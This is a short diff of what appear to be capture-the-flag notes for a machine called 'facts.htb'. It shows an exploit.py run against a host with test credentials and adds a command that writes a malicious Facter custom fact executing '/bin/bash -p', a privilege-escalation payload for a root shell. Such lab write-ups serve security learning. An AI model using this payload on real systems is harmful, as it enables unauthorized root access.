@@ -59,6 +59,14 @@ dv.paragraph("```bash\n" + command + "\n```");
 
 python exploit.py -u http://alienone.in -U test -P test
 
+```
+echo 'Facter.add(:exploit) do
+  setcode do
+    exec("/bin/bash -p")
+  end
+end' > /tmp/facts/exploit.rb
+```
+
 ---
 
 trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
